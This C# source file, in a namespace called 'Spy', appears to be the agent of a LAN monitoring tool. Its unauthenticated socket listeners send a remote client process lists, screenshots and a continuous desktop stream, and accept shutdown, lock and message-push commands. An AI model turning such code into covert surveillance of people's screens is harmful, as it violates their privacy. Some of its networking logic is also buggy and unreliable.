using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Text.RegularExpressions;
using Spy;
using System.Windows.Forms;
using System.Drawing.Imaging;
using System.Drawing;
using System.IO;

namespace Spy.background
{
    public class Socketmain
    {
        public static int flag = 0;
        string match1 = "[%]";
        string match2 = "[&]";
        public static string result1;
        public static string result2;
        const int BufferSize = 10240;
        const int PerLongCount = sizeof(long);
        Byte[] MsgSend;
        Socket s2003;
        public void socket()
        {
            Thread thread1;
            thread1 = new Thread(new ThreadStart(socket2000));
            thread1.IsBackground = true;
            thread1.Start();
            Thread thread2;
            thread2 = new Thread(new ThreadStart(socket2001));
            thread2.IsBackground = true;
            thread2.Start();
            Thread thread3;
            thread3 = new Thread(new ThreadStart(socket2002));
            thread3.IsBackground = true;
            thread3.Start();
            Thread thread4;
            thread4 = new Thread(new ThreadStart(socket2003));
            thread4.IsBackground = true;
            thread4.Start();
        }
        void socket2000()
        {

            int port = 2000;
            //string host = "127.0.0.1";
            string host = Main.MYIP;
            //创建终结点
            
            IPAddress ip = IPAddress.Parse(host);

            IPEndPoint ipe = new IPEndPoint(ip, port);

            //创建Socket并开始监听

            while (true)
            {
                try
                {

                    Socket s = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp); //创建一个Socket对象，如果用UDP协议，则要用SocketTyype.Dgram类型的套接字
                    s.Bind(ipe);    //绑定EndPoint对象(2000端口和ip地址)
                    s.Listen(0);    //开始监听



                    Console.WriteLine("等待客户端连接2000");



                    //接受到Client连接，为此连接建立新的Socket，并接受消息

                    Socket temp = s.Accept();   //为新建立的连接创建新的Socket


                    Console.WriteLine("建立连接2000");

                    string recvStr = "";

                    byte[] recvBytes = new byte[1024];

                    int bytes;
                    

                    while (true)
                    {
                        try
                        {
                            //string sendStr = "连接成功";
                            //byte[] bs = Encoding.BigEndianUnicode.GetBytes(sendStr);
                            //temp.Send(bs, bs.Length, 0);
                            //Console.WriteLine("发送了");
                            string sendStr;
                            byte[] bs;

                            bytes = temp.Receive(recvBytes, recvBytes.Length, 0); //从客户端接受消息

                            recvStr += Encoding.BigEndianUnicode.GetString(recvBytes, 0, bytes);



                            Console.WriteLine("server get message:{0}", recvStr);    //把客户端传来的信息显示出来
                            result1 = recvStr;
                            result2 = recvStr;
                            result1 = result1.Substring(result1.IndexOf(match1) + 3);
                            result1 = result1.Substring(0, result1.IndexOf(match1));
                            Console.WriteLine("server get message:{0}", result1);
                            if (result1 == "进程列表")
                            {
                                flag = 1;
                                Console.WriteLine(flag);
                                string exepath = Environment.CurrentDirectory;
                                string path = exepath + @"\pro\prototal.txt";
                                string protxt = System.IO.File.ReadAllText(path);
                                byte[] fssize = new byte[protxt.Length];
                                int length = protxt.Length;
                                byte[] leng = System.BitConverter.GetBytes(length);
                                temp.Send(leng);
                                fssize = System.Text.Encoding.Default.GetBytes(protxt);
                                temp.Send(fssize);
                                //sendStr = "进程接收成功";
                                //bs = Encoding.BigEndianUnicode.GetBytes(sendStr);
                                //temp.Send(bs, bs.Length, 0);
                                Console.WriteLine("发送进程成功");

                            }
                            if (result1 == "推送")
                            {
                                result2 = result2.Substring(result2.IndexOf(match2) + 3);
                                result2 = result2.Substring(0, result2.IndexOf(match2));
                                Console.WriteLine("server get message:{0}", result2);
                                flag = 2;
                                Console.WriteLine(flag);
                                sendStr = "推送接收成功";
                                bs = Encoding.BigEndianUnicode.GetBytes(sendStr);
                                temp.Send(bs, bs.Length, 0);
                            }
                            if (result1 == "主机关闭")
                            {
                                flag = 3;
                                sendStr = "关机接收成功";
                                bs = Encoding.BigEndianUnicode.GetBytes(sendStr);
                                temp.Send(bs, bs.Length, 0);
                                Console.WriteLine(flag);
                            }
                            if (result1 == "主机锁定")
                            {
                                flag = 4;
                                sendStr = "锁定接收成功";
                                bs = Encoding.BigEndianUnicode.GetBytes(sendStr);
                                temp.Send(bs, bs.Length, 0);
                                Console.WriteLine(flag);
                            } 
                            if (result1 == "即时截图")
                            {
                                flag = 5;
                                Console.WriteLine(flag);
                                string path = printscreen();
                                /*Image img = Image.FromFile(path);
                                Console.WriteLine(path);
                                byte[] buffer = imageToByteArray(img);
                                Console.WriteLine("图片读取ok");
                                temp.Send(buffer, buffer.Length, SocketFlags.None);
                                Console.WriteLine("发送图片成功");*/
                                Image img = Image.FromFile(path);
                                System.IO.FileStream fs = new System.IO.FileStream(path, System.IO.FileMode.OpenOrCreate, System.IO.FileAccess.Read);
                                byte[] fssize = new byte[fs.Length];
                                System.IO.BinaryReader strread = new System.IO.BinaryReader(fs);
                                strread.Read(fssize, 0, fssize.Length - 1);
                                temp.Send(fssize, fssize.Length,0);
                                sendStr = "截图接收成功";
                                bs = Encoding.BigEndianUnicode.GetBytes(sendStr);
                                temp.Send(bs,bs.Length,0);
                                Console.WriteLine("发送图片成功");
                            }

                            //sendStr = "ok!Client send message successful!";

                            //bs = Encoding.BigEndianUnicode.GetBytes(sendStr);

                            //temp.Send(bs,bs.Length, 0);  //返回信息给客户端

                            temp.Close();
                            Console.ReadLine();
                            s.Close();                           
                        }
                        catch
                        {
                            temp.Close();
                            Console.ReadLine();
                            s.Close();
                            break;
                        }
                    }
                }
                catch
                {
                    
                }
            }

        }
        public void socket2001()
        {

            int port = 2001;
            //string host = "127.0.0.1";
            string host = Main.MYIP;
            //创建终结点

            IPAddress ip = IPAddress.Parse(host);

            IPEndPoint ipe = new IPEndPoint(ip, port);



            //创建Socket并开始监听

            while (true)
            {
                
                    Socket s = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp); //创建一个Socket对象，如果用UDP协议，则要用SocketTyype.Dgram类型的套接字
                    s.Bind(ipe);    //绑定EndPoint对象(2000端口和ip地址)
                    s.Listen(0);    //开始监听
                


                    Console.WriteLine("等待客户端连接2001");



                    //接受到Client连接，为此连接建立新的Socket，并接受消息

                    Socket temp = s.Accept();   //为新建立的连接创建新的Socket


                    Console.WriteLine("建立连接2001");
                try
                {
                    //string recvStr = "";

                    byte[] recvBytes = new byte[1024];

                    //int bytes;

                    string sendStr;
                    byte[] bs;
                    while (true)
                    {
                        try
                        {
                            sendStr = "%" + Main.network.up + "@" + Main.network.down + "%";
                            bs = Encoding.BigEndianUnicode.GetBytes(sendStr);
                            temp.Send(bs, bs.Length, 0);
                            Console.WriteLine("'" + sendStr + "'");
                            Thread.Sleep(1000);
                        }
                        catch
                        {
                            temp.Close();
                            s.Close();
                            break;
                        }
                    }

                }
                catch
                {
                   temp.Close();
                   s.Close();
                }
            }

        }

        void socket2002()
        {

            int port = 2002;
            //string host = "127.0.0.1";
            string host = Main.MYIP;
            //创建终结点

            IPAddress ip = IPAddress.Parse(host);

            IPEndPoint ipe = new IPEndPoint(ip, port);

            //创建Socket并开始监听

            while (true)
            {
                try
                {

                    Socket s = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp); //创建一个Socket对象，如果用UDP协议，则要用SocketTyype.Dgram类型的套接字
                    s.Bind(ipe);    //绑定EndPoint对象(2000端口和ip地址)
                    s.Listen(0);    //开始监听



                    Console.WriteLine("等待客户端连接2002");



                    //接受到Client连接，为此连接建立新的Socket，并接受消息

                    Socket temp = s.Accept();   //为新建立的连接创建新的Socket


                    Console.WriteLine("建立连接2002");

                    string recvStr = "";

                    byte[] recvBytes = new byte[1024];

                    int bytes;


                    while (true)
                    {
                        try
                        {
                            //string sendStr = "连接成功";
                            //byte[] bs = Encoding.BigEndianUnicode.GetBytes(sendStr);
                            //temp.Send(bs, bs.Length, 0);
                            //Console.WriteLine("发送了");
                            string sendStr;
                            byte[] bs;

                            bytes = temp.Receive(recvBytes, recvBytes.Length, 0); //从客户端接受消息

                            recvStr += Encoding.BigEndianUnicode.GetString(recvBytes, 0, bytes);



                            Console.WriteLine("server get message:{0}", recvStr);    //把客户端传来的信息显示出来
                            result1 = recvStr;
                            result2 = recvStr;
                            result1 = result1.Substring(result1.IndexOf(match1) + 3);
                            result1 = result1.Substring(0, result1.IndexOf(match1));
                            Console.WriteLine("server get message:{0}", result1);
                          
                            if (result1 == "推送")
                            {
                                result2 = result2.Substring(result2.IndexOf(match2) + 3);
                                result2 = result2.Substring(0, result2.IndexOf(match2));
                                Console.WriteLine("server get message:{0}", result2);
                                flag = 2;
                                Console.WriteLine(flag);
                                sendStr = "推送接收成功";
                                bs = Encoding.BigEndianUnicode.GetBytes(sendStr);
                                temp.Send(bs, bs.Length, 0);
                            }

                            temp.Close();
                            Console.ReadLine();
                            s.Close();
                        }
                        catch
                        {
                            temp.Close();
                            Console.ReadLine();
                            s.Close();
                            break;
                        }
                    }
                }
                catch
                {

                }
            }

        }



        void socket2003()
        {

            int port = 2003;
            //string host = "127.0.0.1";
            string host = Main.MYIP;
            //创建终结点

            IPAddress ip = IPAddress.Parse(host);

            IPEndPoint ipe = new IPEndPoint(ip, port);
            //创建Socket并开始监听

                try
                {
                    lock (this)
                    {
                    s2003 = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp); //创建一个Socket对象，如果用UDP协议，则要用SocketTyype.Dgram类型的套接字
                    s2003.Bind(ipe);    //绑定EndPoint对象(2000端口和ip地址)
                    s2003.Listen(0);    //开始监听



                    Console.WriteLine("等待客户端连接2003");



                    //接受到Client连接，为此连接建立新的Socket，并接受消息

                    Socket temp2003 = s2003.Accept();   //为新建立的连接创建新的Socket


                    Console.WriteLine("建立连接2003");
                    string sendStr;
                    byte[] bs;
                    int bytes;
                    byte[] recvBytes = new byte[1024];
                    string recvStr = "";

                    bytes = temp2003.Receive(recvBytes, recvBytes.Length, 0); //从客户端接受消息

                    recvStr += Encoding.BigEndianUnicode.GetString(recvBytes, 0, bytes);
                    Console.WriteLine("server get message:{0}", recvStr); 
                    //int REnd = s2003.Receive(recvBytes);
                    //string msg = Encoding.Unicode.GetString(recvBytes, 0, REnd);
                    if (recvStr == "Send")
                        try
                        {
                            MsgSend = new byte[65535];
                            MsgSend = new Monitor().GetDesktopBitmapBytes();
                            //MsgSend = Encoding.Unicode.GetBytes("图片" + imgIndex);
                            if (temp2003.Connected)
                            {
                                //将数据发送到连接的 System.Net.Sockets.Socket。
                                temp2003.Send(MsgSend);
                                temp2003.BeginSend(MsgSend, 0, MsgSend.Length, SocketFlags.None, new AsyncCallback(ReceiveCallBack), temp2003);
                            }
                        }
                        catch
                        {
                            temp2003.Close();
                            Console.ReadLine();
                            s2003.Close();
                        }
                    
                    }
                }
              catch
              {
                  
                  Console.ReadLine();
                  s2003.Close();
                  socket2003();
              }
            
            }

        protected void ReceiveCallBack(IAsyncResult AR)
        {
            try
            {
                Socket listener = (Socket)AR.AsyncState;
                //将用户登录信息发送至服务器，由此可以让其他客户端获知
                //ClientSocket.Send(Encoding.Unicode.GetBytes("用户： " + IPAddress.Any + " 进入系统！\n"));
                MsgSend = new Monitor().GetDesktopBitmapBytes();
                if (listener.Connected)
                {
                    //将数据发送到连接的 System.Net.Sockets.Socket。
                    //ClientSocket.Send(MsgSend);
                    //AsyncCallback引用在异步操作完成时调用的回调方法
                    listener.BeginSend(MsgSend, 0, MsgSend.Length, SocketFlags.None, new AsyncCallback(ReceiveCallBack), listener);
                }
            }
            catch
            {
                s2003.Close();
                socket2003();
            }
        }

       
    


            string printscreen()
        {
            string fastpath;
            Bitmap image = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
            Graphics imgGraphics = Graphics.FromImage(image);
            imgGraphics.CopyFromScreen(0, 0, 0, 0, new Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height));
            string exepath = Environment.CurrentDirectory;
            if (System.IO.File.Exists(exepath + @"\Text1.txt") == true)
            {
                StreamReader sr = File.OpenText(exepath + @"\Text1.txt");
                string path = sr.ReadLine();
                if (Directory.Exists(path) == false)//如果不存在就创建file文件夹
                {
                    Directory.CreateDirectory(path);
                }
                fastpath = path + DateTime.Now.ToString("yyyy-M-d@HH.mm.ss") + ".jpg";
                image.Save(fastpath, System.Drawing.Imaging.ImageFormat.Jpeg); //保存
                sr.Close();
            }
            else
            {
                MessageBox.Show("保存路径不存在自动保存在" + exepath + @"\PrintScreen");
                File.WriteAllText(exepath + @"\Text1.txt", exepath + @"\PrintScreen\");
                if (Directory.Exists(exepath + @"\PrintScreen\") == false)//如果不存在就创建file文件夹
                {
                    Directory.CreateDirectory(exepath + @"\PrintScreen\");

                }
                fastpath = exepath + @"\PrintScreen\" + DateTime.Now.ToString("yyyy-M-d@HH.mm.ss") + ".jpg";
                image.Save(fastpath, System.Drawing.Imaging.ImageFormat.Jpeg); //保存

            }
            return fastpath;
        }
            
            private static byte[] ReadImageFile(String img)
            {
                FileInfo fileinfo = new FileInfo(img);
                byte[] buf = new byte[fileinfo.Length];
                FileStream fs = new FileStream(img, FileMode.Open, FileAccess.Read);
                fs.Read(buf, 0, buf.Length);
                fs.Close();
                //fileInfo.Delete ();
                GC.ReRegisterForFinalize(fileinfo);
                GC.ReRegisterForFinalize(fs);
                return buf;
            }
            public static byte[] imageToByteArray(System.Drawing.Image imageIn)
            {
                if (imageIn == null)
                    return null;

                using (System.IO.MemoryStream ms = new System.IO.MemoryStream())
                {
                    imageIn.Save(ms, System.Drawing.Imaging.ImageFormat.Jpeg);
                    return ms.ToArray();
                }
            }
            

    }
    

}


        
